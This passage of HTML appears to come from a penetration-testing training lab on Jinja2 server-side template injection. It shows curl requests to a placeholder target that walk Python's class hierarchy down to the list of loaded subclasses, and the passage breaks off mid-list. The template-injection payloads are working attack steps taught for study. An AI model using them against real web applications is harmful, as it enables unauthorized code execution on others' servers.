+</code></pre></div></div>
+<h4>Curl - Interacting with the Target</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Curl - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -gs <span class="token string">"http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D"</span></span></span>
+
+<span class="token output">&lt;SNIP&gt;
+&lt;body&gt;
+	&lt;div id="desktop"&gt;
+		&lt;div class="window" data-title="Run"&gt;
+			&lt;form action="/execute" method="get"&gt;
+				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;
+				&lt;br/&gt;
+</span><span class="token info punctuation">				&lt;a&gt;&amp;lt;class &amp;</span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash"><span class="token number">39</span><span class="token punctuation">;</span>str<span class="token operator">&amp;</span><span class="token comment">#39;&amp;gt;</span></span></span><span class="token output">&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;input type="submit" value="execute"&gt;
+			&lt;/form&gt;
+		&lt;/div&gt;
+&lt;SNIP&gt;
+&lt;/body&gt;
+</span></code></pre></div></div>
+<h4>Payload</h4>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__ <span class="token punctuation">}</span><span class="token punctuation">}</span>
+</code></pre></div></div>
+<h4>Curl - Interacting with the Target</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Curl - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -gs <span class="token string">"http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"</span></span></span>
+
+<span class="token output">&lt;SNIP&gt;
+&lt;body&gt;
+	&lt;div id="desktop"&gt;
+		&lt;div class="window" data-title="Run"&gt;
+			&lt;form action="/execute" method="get"&gt;
+				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;
+				&lt;br/&gt;
+</span><span class="token info punctuation">				&lt;a&gt;(&amp;lt;class &amp;</span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash"><span class="token number">39</span><span class="token punctuation">;</span>str<span class="token operator">&amp;</span><span class="token comment">#39;&amp;gt;, &amp;lt;class &amp;#39;object&amp;#39;&amp;gt;)</span></span></span><span class="token output">&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;input type="submit" value="execute"&gt;
+			&lt;/form&gt;
+		&lt;/div&gt;
+&lt;SNIP&gt;
+&lt;/body&gt;
+</span></code></pre></div></div>
+<p>We are interested in the second item, so the payload should become:</p>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
+</code></pre></div></div>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Curl - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -gs <span class="token string">"http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"</span></span></span>
+
+<span class="token output">&lt;SNIP&gt;
+&lt;body&gt;
+	&lt;div id="desktop"&gt;
+		&lt;div class="window" data-title="Run"&gt;
+			&lt;form action="/execute" method="get"&gt;
+				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;
+				&lt;br/&gt;
+</span><span class="token info punctuation">				&lt;a&gt;&amp;lt;class &amp;</span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash"><span class="token number">39</span><span class="token punctuation">;</span>object<span class="token operator">&amp;</span><span class="token comment">#39;&amp;gt;</span></span></span><span class="token output">&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;input type="submit" value="execute"&gt;
+			&lt;/form&gt;
+		&lt;/div&gt;
+&lt;SNIP&gt;
+&lt;/body&gt;
+</span></code></pre></div></div>
+<p>Let us start walking down the hierarchy, as follows.</p>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
+</code></pre></div></div>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Curl - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -gs <span class="token string">"http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D"</span></span></span>
+
+<span class="token output">&lt;SNIP&gt;
+&lt;body&gt;
+	&lt;div id="desktop"&gt;
+		&lt;div class="window" data-title="Run"&gt;
+			&lt;form action="/execute" method="get"&gt;
+				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;
+				&lt;br/&gt;
+</span><span class="token info punctuation">				&lt;a&gt;[&amp;lt;class &amp;</span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash"><span class="token number">39</span><span class="token punctuation">;</span><span class="token builtin class-name">type</span><span class="token operator">&amp;</span><span class="token comment">#39;&amp;gt;, &amp;lt;class &amp;#39;weakref&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakcallableproxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakproxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;int&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytearray&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytes&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;list&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;NoneType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;NotImplementedType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;traceback&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;super&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;range&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_keys&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_values&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_items&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_reversekeyiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_reversevalueiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_reverseitemiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;odict_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;set&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;str&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;slice&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;staticmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;complex&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;float&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;frozenset&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;property&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;managedbuffer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;memoryview&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tuple&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;enumerate&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;reversed&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;stderrprinter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;code&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;frame&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;builtin_function_or_method&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;method&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;function&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;mappingproxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;generator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;getset_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;wrapper_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;method-wrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ellipsis&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;member_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;types.SimpleNamespace&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;PyCapsule&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;longrange_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;cell&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;instancemethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;classmethod_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;method_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;callable_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle.PickleBuffer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;coroutine&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;coroutine_wrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;InterpreterID&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;EncodingMap&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;fieldnameiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;formatteriterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;BaseException&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt_array_node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt_bitmap_node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt_collision_node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;keys&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;values&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;items&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ContextVar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Token&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Token.MISSING&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;moduledef&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;module&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;filter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;map&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zip&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._ModuleLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._DummyModuleLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._ModuleLockManager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib.ModuleSpec&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib.BuiltinImporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;classmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib.FrozenImporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._ImportLockContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread._localdummy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread._local&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread.lock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread.RLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_io._IOBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_io._BytesIOBuffer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_io.IncrementalNewlineDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;posix.ScandirIterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;posix.DirEntry&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.WindowsRegistryFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external._LoaderBasics&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.FileLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external._NamespacePath&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external._NamespaceLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.PathFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.FileFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zipimport.zipimporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zipimport._ZipImportResourceReader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.Codec&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.IncrementalEncoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.IncrementalDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.StreamReaderWriter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.StreamRecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_abc_data&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;abc.ABC&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_itemiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Hashable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Awaitable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.AsyncIterable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;async_generator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Iterable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytes_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytearray_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_keyiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_valueiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;list_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;list_reverseiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;range_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;set_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;str_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tuple_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Sized&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Container&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Callable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;os._wrap_close&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sitebuiltins.Quitter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sitebuiltins._Printer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sitebuiltins._Helper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;operator.itemgetter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;operator.attrgetter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;operator.methodcaller&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.accumulate&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.combinations&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.combinations_with_replacement&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.cycle&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.dropwhile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.takewhile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.islice&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.starmap&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.chain&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.compress&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.filterfalse&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.count&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.zip_longest&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.permutations&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.product&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.repeat&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.groupby&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools._grouper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools._tee&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools._tee_dataobject&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;reprlib.Repr&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.deque&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_collections._deque_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_collections._deque_reverse_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_collections._tuplegetter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections._Link&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.partial&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools._lru_cache_wrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.partialmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.singledispatchmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.cached_property&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;types.DynamicClassAttribute&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;types._GeneratorWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;enum.auto&amp;#39;&amp;gt;, &amp;lt;enum &amp;#39;Enum&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;re.Pattern&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;re.Match&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sre.SRE_Scanner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;sre_parse.State&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;sre_parse.SubPattern&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;sre_parse.Tokenizer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;re.Scanner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;string.Template&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;string.Formatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib.ContextDecorator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib._GeneratorContextManagerBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib._BaseExitStack&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._Final&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._Immutable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.Generic&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._TypingEmpty&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._TypingEllipsis&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.NamedTuple&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.io&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.re&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ast.AST&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;markupsafe._MarkupEscapeHelper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;select.poll&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;select.epoll&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;selectors.BaseSelector&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_socket.socket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_weakrefset._IterationGuard&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_weakrefset.WeakSet&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading._RLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Condition&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Semaphore&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Event&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Barrier&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Thread&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.BaseServer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.ForkingMixIn&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver._NoThreads&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.ThreadingMixIn&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.BaseRequestHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;warnings.WarningMessage&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;warnings.catch_warnings&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.date&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.timedelta&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.time&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.tzinfo&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakref.finalize._Info&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakref.finalize&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha512.sha384&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha512.sha512&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_random.Random&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.parse._ResultMixinStr&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.parse._ResultMixinBytes&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.parse._NetlocResultMixinBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar._localized_month&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar._localized_day&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar.Calendar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar.different_locale&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email._parseaddr.AddrlistClass&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Struct&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;unpack_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.charset.Charset&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.header.Header&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.header._ValueFormatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email._policybase._PolicyBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.feedparser.BufferedSubFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.feedparser.FeedParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.parser.Parser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.parser.BytesParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.message.Message&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.client.HTTPConnection&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl._SSLContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl._SSLSocket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl.MemoryBIO&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl.Session&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ssl.SSLObject&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;mimetypes.MimeTypes&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zlib.Compress&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zlib.Decompress&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_bz2.BZ2Compressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_bz2.BZ2Decompressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_lzma.LZMACompressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_lzma.LZMADecompressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dis.Bytecode&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tokenize.Untokenizer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.BlockFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect._void&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect._empty&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.Parameter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.BoundArguments&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.Signature&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;traceback.FrameSummary&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;traceback.TracebackException&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.LogRecord&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.PercentStyle&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.Formatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.BufferingFormatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.Filter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.Filterer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.PlaceHolder&amp;#39;&amp;gt;, &amp;lt;class {{ ''.__class__.__mro__ }}</span></span></span>
+<span class="token info punctuation">&amp;</span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash"><span class="token number">39</span><span class="token punctuation">;</span>logging.Manager<span class="token operator">&amp;</span><span class="token comment">#39;&amp;gt;, &amp;lt;class &amp;#39;logging.LoggerAdapter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug._internal._Missing&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.exceptions.Aborter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.urls.Href&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;subprocess.CompletedProcess&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;subprocess.Popen&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_hashlib.HASH&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_blake2.blake2b&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_blake2.blake2s&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_224&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_256&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_384&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_512&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.shake_128&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.shake_256&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile._RandomNameSequence&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile._TemporaryFileCloser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile._TemporaryFileWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile.SpooledTemporaryFile&amp;#39;&amp;gt;, &amp;lt;class 